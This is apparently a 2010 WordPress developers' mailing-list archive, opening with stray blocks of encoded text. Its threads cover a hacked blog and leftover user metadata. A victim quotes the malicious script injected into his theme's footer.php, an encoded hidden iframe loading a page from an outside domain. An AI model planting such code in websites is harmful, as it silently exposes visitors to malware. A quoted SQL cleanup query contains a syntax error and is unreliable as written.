>>  gsJGlsnA0pSSvwfiak7B+DTxx2IaduX7LVtigXhafee4JDzB++SGNLlaSsugjCaNOt/P3w1JYj2jx9XFSEmykQ0iKIsFL86vV9x1Ma4nJGbh+Gb3XU3ZAQckT91fVPDLAHYc022EOIlcGV5QWpTKXe+ba0HP7WjkcTpKMSwS2gb3KWNnME5KcuR8NR82OjolUsgw8/ggIzaQ/lohU+yIPaqfqBWCj8AqCsOMadwl9K6/4C62ubYlLz0FiV1DFTyNew9mrajh2n0/WfSiZ5VeRW6HMmvb0FwLz1meJoolM0DrT3gmPUOaZPY126smbX6OoYhIUAXg5PMAyzQSjYgYkRzs4T+hEBi8+2a3DpmiIAwFBLV7zIZMATExeG4HWpq7r74x4OjCx52W6114AOoMBchRp7kPwpW6zkJ3M+KoSSSVdjXqchQjabSY9N0MHjpMxm7gvgkjXd/b9br8e9q3v50jodHQki/H5GwfcH/Ap1Wzo0bQQrJHhZcj0OAa1kGpfGKRvlWNjw/xTMFeXLykjQJSpSdAnjVBIoxQB9muM5tCuZsohQOts3fck7VZmDzLUtLNBj4DFZPBe1iZyb+ZR/TV5KVzlIBE0XQ8fddqQD6HAIZTQfaaNzPgsLsDrFQStGnDEuABZP6VwwUNQnZ1qCTu4n+Hr96p9xJo68rkuFPcpiRAL1XTX1sXns2DAlNTnTziY1ABylYWw3pLGBa5Vp5rjdq1+YfCwZ8CO/Xe7geiHfe6AgnQPqKDf2CC56N0AGfxO4iqy2R+Rij9MPl8blIFsCwh/QC1c8cJUVG8WWoOsscYOy4SDbG9vE62jCAU09I7p0bZCSyO4ikShw/YLjUTbVInJCOrL6ehpDEmP5uvAIa9a1M79rUHGoOS7LrhwKfVC0pVpJ0i/r4FzPKHr246qn5+xWh+ZATuWt37xaSW7vCEzlSS5/cF8KA36jEBLtYlKU1LiZmr1l5PO9pnA2iK0NKt9
>>
>>  btX5ppX8OnUMs/xqOeCI6FUCMY+DrtgCSw1DdQGzpyrQOZnBnFJk5V5+cespVxB1L/8RsLLD9xsh5og+1Jsa5w6bMqc0VmG9bH/k+zdhjsH6HFPcmpmcbQUsUsyskKDl7wtq/zYNYOHApyLa0yOsjWxZnOayDi7S0Faot3c4KjDsGf2S30R45Irfcfae40RHAKxY+gx7WcGZ93IAI8BMig0imCt5IGwN8nmGRaagVeR3QkJnDm6lMlQLxn44s3Evyo1gAbQyeifQxyc/iIkTI+MYi78HYF9zTG2XtqQd1jXi2ZLmFYCnDUTOz0dI3dp0GRCSuVdxadPSWMy2rcLsI8sbva/PtUKECQNhjuEge5jguzRQk8HIeoUSMtRYj3OyWVvK8dMtNVdlLxE/Ga9MwppDBY/x9S3Fwxp47cbF3s5qde9VUvs
>>
>>
>>
>> I did remove it. I did add security at wordpress.org to this thread.
>>
>> Comments appreciated.
>>
>>
>>
>>
>>
>>
>> On Sun, Oct 31, 2010 at 7:15 PM, Ozh <ozh at ozh.org> wrote:
>>
>> > Typically not a Dreamhost issue, otherwise there would be *thousands*
>> > of people screaming, and me in first line
>> >
>> > Being up to date with WP is fine, but most hack on shared hosting are
>> > not done using WP
>> > - check file permissions <
>> http://codex.wordpress.org/Hardening_WordPress>
>> > - check other softwares & scripts running on your blog
>> > - change your main/SSH/FTP password
>> > - change your WP password
>> >
>> > I once had a WP blog hacked on Dreamhost. A few hours of investigation
>> > later (checking all the above + inspecting access logs) I found out
>> > that the insecure stuff was Scuttle (a delicious clone).
>> >
>> > On shared hosting WP is often the target, but rarely the entrance.
>> >
>> > On Sun, Oct 31, 2010 at 4:07 PM, Mladen Adamovic
>> > <mladen.adamovic at gmail.com> wrote:
>> > > Hi guys,
>> > >
>> > > My wordpress software instance was repeatedly hacked ... running
>> latest
>> > > Wordpress source code and being hosted on Dreamhost.
>> > >
>> > > I don't know which exploit it did use and couldn't identify it, but it
>> > was
>> > > adding the following code to my default theme footer.php:
>> > >
>> > > <script>
>> > > enc =
>> > >
>> >
>> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
>> > > withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
>> > > dec = unescape(enc);
>> > > document.write(dec);
>> > > </script>
>> > >
>> > > I think I'll have to migrate to Blogger, since I couldn't identify
>> > exploit
>> > > it did use.
>> > >
>> > > I wanted to drop you an email anyhow since identifying exploits is
>> > > important!
>> > > _______________________________________________
>> > > wp-hackers mailing list
>> > > wp-hackers at lists.automattic.com
>> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > >
>> >
>> >
>> >
>> > --
>> > http://ozh.org/
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From ozh at ozh.org  Sun Oct 31 19:26:22 2010
From: ozh at ozh.org (Ozh)
Date: Sun, 31 Oct 2010 20:26:22 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTikTTcKPGoFBNHM-nsGNMz8Mvn+0DiWF9dUnsaXx@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
	<AANLkTimGFeij-S2vqFrBH_j9UUwpZ1J+rAxX3P-uctOd@mail.gmail.com>
	<AANLkTikGVDSR69=oDx0458Ta+hLwQF=yzrfA0KpsT1Xy@mail.gmail.com>
	<AANLkTikTTcKPGoFBNHM-nsGNMz8Mvn+0DiWF9dUnsaXx@mail.gmail.com>
Message-ID: <AANLkTinjuZjphBvw-yUSjh253Gw2d9TvYEBgNNdmCe0s@mail.gmail.com>

This seems to be the regular case of shared hosting hacking. No need
to add security at wp in this thread.


-- 
http://ozh.org/

From e at leau.net  Sun Oct 31 20:00:31 2010
From: e at leau.net (Edward de Leau)
Date: Sun, 31 Oct 2010 21:00:31 +0100
Subject: [wp-hackers] Remove useless usermeta
In-Reply-To: <052E05C0-D836-45C9-9F55-571EDB9BD7DB@newclarity.net>
References: <AANLkTi=GbKrw+CEJD6LTft0CwyiVp8v4Prx93tHEffhL@mail.gmail.com>
	<052E05C0-D836-45C9-9F55-571EDB9BD7DB@newclarity.net>
Message-ID: <AANLkTi=7j2hx57gKUoCJi7kyoe9e7GEzqSFRHHffws92@mail.gmail.com>

this is related to this topic "remove useless metadata":

If you remove users it will not remove (all) this metadata in the metadata
user field. this includes wp_capabilities and wp_usermedata entries and
entries made by plugins in this table for these users.

that in itself is not a problem... but in the GUI of the users the COUNTER
counts on the basis of unique entries of users in the metadata table and not
the user table meaning.... you can delete a lot of users but the counter you
see there  in the gui will never
go down even if the user itself no longer exists in the user table.

So... "remove useless metadata" (also for the user counter in the "users"
screen)





On Fri, Oct 8, 2010 at 5:20 AM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Oct 7, 2010, at 10:29 PM, Alex Hempton-Smith wrote:
> > Is there an easy way I can remove useless user meta from the wp_usermeta
> > table, and stop it from being put there for new signups?
> >
> > Almost all of our users have no need for data like 'rich_editing',
> > 'comment_shortcuts', 'admin_color', 'aim', 'yim' or 'jabber'.
> >
> > I've already disabled the 'aim', 'yim' and 'jabber' contact fields, so
> these
> > aren't being created now. However, I think WordPress should only create
> the
> > other mentioned fields if the user has the capability to edit posts or
> > moderate comments. It's creating two unnecessary usermeta entries for
> each
> > user.
> >
> > In the meantime, is there a filter I can use to stop this usermeta from
> > being created at user creation? And then perhaps only be set if the user
> > explicitly sets that option in the admin panel?
>
>
> This SQL will get rid of them using this SQL:
>
> DELETE FROM wp_usermeta
> WHERE AND meta_key IN ('rich_editing','comment_shortcuts', 'admin_color',
> 'aim', 'yim', 'jabber')
> AND TRIM(IFNULL(meta_value,''))=''
>
> Then you can either "update_user_meta" to delete right after inserted
> (since there is not a direct way to abort the insert) or you can try the
> "query" hook using regular expressions to match the appropriate replace
> "INSERT {$wpdb->usermeta} SET..." queries with something benign like "SELECT
> 0".
>
> Hope this helps.
>
> -Mike
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From martin at fiercestreetnetworks.com  Sun Oct 31 21:14:09 2010
From: martin at fiercestreetnetworks.com (Martin Espericueta)
Date: Sun, 31 Oct 2010 14:14:09 -0700
Subject: [wp-hackers] wp-hackers Digest, Vol 69, Issue 64
In-Reply-To: <mailman.29212.1288548955.1338.wp-hackers@lists.automattic.com>
References: <mailman.29212.1288548955.1338.wp-hackers@lists.automattic.com>
Message-ID: <op.vlgk9v2owv2dpm@kat-pc.hsd1.ca.comcast.net>

On Sun, 31 Oct 2010 11:15:55 -0700,  
<wp-hackers-request at lists.automattic.com> wrote:

> avast!: Message body was removed because it contained a virus.

avast! [KAT-PC]: File "Incoming email 'wp-hackers Digest, Vol 69, Issue  
64' From: wp-hackers-request at lists.automattic.com, To:  
wp-hackers at lists.automattic.com" is infected by "JS:ScriptPE-inf [Trj]"  
virus.
"%3" task used
Version of current VPS file is 101031-0, 10/31/2010
>
Any thoughts as to this?

-- 
Best Regards,

Martin Espericueta

Follow me, I'm gsbmartin on Twitter
Friend me up, I'm gsbmartin on Facebook
And check out the website German Shepherd Training
And more of my sites: Mozart's Music
Plain Old Semantic HTML
Semantic HTML
Web Designs with Standards

From 24-7 at gmx.net  Sun Oct 31 22:58:13 2010
From: 24-7 at gmx.net (24/7)
Date: Sun, 31 Oct 2010 15:58:13 -0700 (PDT)
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTinjuZjphBvw-yUSjh253Gw2d9TvYEBgNNdmCe0s@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
	<AANLkTimGFeij-S2vqFrBH_j9UUwpZ1J+rAxX3P-uctOd@mail.gmail.com>
	<AANLkTikGVDSR69=oDx0458Ta+hLwQF=yzrfA0KpsT1Xy@mail.gmail.com>
	<AANLkTikTTcKPGoFBNHM-nsGNMz8Mvn+0DiWF9dUnsaXx@mail.gmail.com>
	<AANLkTinjuZjphBvw-yUSjh253Gw2d9TvYEBgNNdmCe0s@mail.gmail.com>
Message-ID: <14a5819d-0d14-4311-b3ab-a4cbc16785b9@26g2000yqv.googlegroups.com>

1. No recommendation for mediatemple: I had the same problem
(injection of mal content in posts table) with the mediatemple grid
service. I got different versions of WordPress running from 2.7 to
latest. Due to the fact, that nearly all of them got hacked and some
didn't share one single script, plugin or even the version nr, i would
say, the attack was at the shared service and not at the WordPress
installations. No attack would target that many different doors at the
same time (i guess).

My problem with mediatemple is, that this happend the second time now.
I found the first mal content at the end of july, wrote a plugin to
check the DB and removed the content from there. I immediately offered
it to them, but they only wanted it if they get it for free (I stil
pay for their "service"). Now, in the middle of october, they notified
me, that my databases were "cleaned up"... Thanks for nothing.

2. If you want that plugin: Just drop me a mail. You get it for
free :)

Wish you best.

-K.

